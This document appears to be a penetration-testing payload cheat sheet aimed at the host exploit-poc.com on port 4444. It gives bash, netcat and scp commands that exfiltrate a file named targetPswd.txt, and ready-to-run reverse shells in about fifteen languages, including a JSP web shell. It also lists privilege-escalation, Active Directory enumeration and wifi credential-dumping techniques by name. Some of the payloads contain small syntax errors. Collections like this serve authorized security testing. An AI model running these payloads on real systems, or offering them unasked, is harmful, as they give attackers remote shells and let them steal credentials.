## test data info
```
Host: exploit-poc.com
port:4444
fileName:targetPswd.txt
test str:{"k":"=this is test&","xx":"=999"}
```

## File_transfer
#### 0
```

    bash -c 'echo -e "POST / HTTP/0.9

$(<targetPswd.txt)" > /dev/tcp/exploit-poc.com/4444'
    
```

#### 1
```
 
    bash -c 'cat targetPswd.txt > /dev/tcp/exploit-poc.com/4444'
    
```

#### 2
```
bash -c 'cat < /dev/tcp/exploit-poc.com/4444 > targetPswd.txt'
```

#### 3
```
nc exploit-poc.com 4444 < targetPswd.txt
```

#### 4
```
python3 -m http.server 4444
```

#### 5
```
python -m SimpleHTTPServer 4444
```

#### 6
```
scp targetPswd.txt username@exploit-poc.com:~/destination -P 4444
```

#### 7
```
scp user@exploit-poc.com:~/path_to_file file_saved -P 4444
```

## ReverseShell
#### bash_rshell
```
bash -c 'exec bash -i &>/dev/tcp/exploit-poc.com/4444 <&1'
```

#### netcat_rshell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc exploit-poc.com 4444 >/tmp/f
```

#### php_rshell
```
php -r '$sock=fsockopen(getenv("exploit-poc.com"),getenv("4444"));exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### PS_rshell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('exploit-poc.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### perl_rshell
```
perl -e 'use Socket;$i="$ENV{exploit-poc.com}";$p=$ENV{4444};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### python_rshell
```
python -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv("exploit-poc.com"),int(os.getenv("4444"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn("/bin/sh")'
```

#### ruby_rshell
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["exploit-poc.com"],ENV["4444"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

#### telnet_rshell
```
TF=$(mktemp -u); mkfifo $TF && telnet exploit-poc.com 4444 0<$TF | /bin sh 1>$TF
```

#### zsh_rshell
```
zsh -c 'zmodload zsh/net/tcp && ztcp exploit-poc.com 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

#### r/shell_reverse_tcp
```
s<-socketConnection(host='exploit-poc.com',port=4444,blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines(pipe(readLines(s, 1))),s)}
```

#### cmd/unix/reverse_lua
```
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('exploit-poc.com',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
```

#### nodejs/shell_reverse_tcp
```
(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, "exploit-poc.com", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();
```

#### nodejs/shell_reverse_tcp_ssl
```
(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("tls"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, "exploit-poc.com", {rejectUnauthorized:false}, function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();
```

#### cmd/unix/reverse_awk
```
awk 'BEGIN{s="/inet/tcp/0/exploit-poc.com/4444";do{if((s|&getline c)<=0)break;if(c){while((c|&getline)>0)print $0|&s;close(c)}} while(c!="exit")close(s)}'
```

#### java/jsp_shell_reverse_tcp
```
<%@page import="java.lang.*"%>
	<%@page import="java.util.*"%>
	<%@page import="java.io.*"%>
	<%@page import="java.net.*"%>
	
	<%
	  class StreamConnector extends Thread
	  {
		InputStream zP;
		OutputStream l7;
	
		StreamConnector( InputStream zP, OutputStream l7 )
		{
		  this.zP = zP;
		  this.l7 = l7;
		}
	
		public void run()
		{
		  BufferedReader tC  = null;
		  BufferedWriter uYY = null;
		  try
		  {
			tC  = new BufferedReader( new InputStreamReader( this.zP ) );
			uYY = new BufferedWriter( new OutputStreamWriter( this.l7 ) );
			char buffer[] = new char[8192];
			int length;
			while( ( length = tC.read( buffer, 0, buffer.length ) ) > 0 )
			{
			  uYY.write( buffer, 0, length );
			  uYY.flush();
			}
		  } catch( Exception e ){}
		  try
		  {
			if( tC != null )
			  tC.close();
			if( uYY != null )
			  uYY.close();
		  } catch( Exception e ){}
		}
	  }
	
	  try
	  {
		String ShellPath;
	if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
	  ShellPath = new String("/bin/sh");
	} else {
	  ShellPath = new String("cmd.exe");
	}
	
		Socket socket = new Socket( "exploit-poc.com", 4444 );
		Process process = Runtime.getRuntime().exec( ShellPath );
		( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
		( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
	  } catch( Exception e ) {}
	%>
```

## LinuxCommands
- Suid
- VersionSystem
- KernelVersion
- EnvironmentVariables
- ServiceSettings
- CronJobs
- UsersHost
- PortForwarding
- wildcardPrivesc
## PowershellCommands
- local_sys_enum
- lastpatchlist
- lastpatchlist_wmic
- envVar
- envVar_cmd
- wlan_creddump
- powershell_http_dl
- cmd_cert_http_dl
- domain_name
- forest_domain_list
- domain_SID
- domain_Policy
- domain_OUs
- domain_trust
- gpo_enum
- passwd_lastset
- user_desc_harvest
- domain_computers
- domain_pingable_computers
- domain_win7U_computers
- domain_admin_members
- domain_admins_groups
- local_admins
- user_group_membership
- ACL_user_enum
- ACL_gpoedit_rights
- ACL_passwd_edit_rights
## TtySpawnShell
- Python2 spawn shell 
- Fully Interactive TTY python3
- OS system spawn shell
- Bash spawn shell
- Perl spawn shell
- Ruby spawn shell
- Lua spawn shell
- IRB spawn shell
- VI spawn shell
- VI(2) spawn shell
- Nmap spawn shell
## base64
- encode
- decode
## hashing
- md4
- md5
- md5-sha1
- ripemd160
- rsa-md4
- rsa-md5
- rsa-ripemd160
- rsa-sha1
- rsa-sha1-2
- rsa-sha224
- rsa-sha256
- rsa-sha384
- rsa-sha512
- sha1
- sha224
- sha256
- sha384
- sha512
- md4withrsaencryption
- md5withrsaencryption
- ripemd
- ripemd160withrsa
- rmd160
- sha1withrsaencryption
- sha224withrsaencryption
- sha256withrsaencryption
- sha384withrsaencryption
- sha512withrsaencryption
- ssl3-md5
- ssl3-sha1
- whirlpool
- sm3
## hex
- encode
- decode
## URLS
- url parms to json
- json to url parms
- url full decode
- url full encode
- js full encode
- js full decode
- html full encode
- html full decode
## url
- encode
- decode
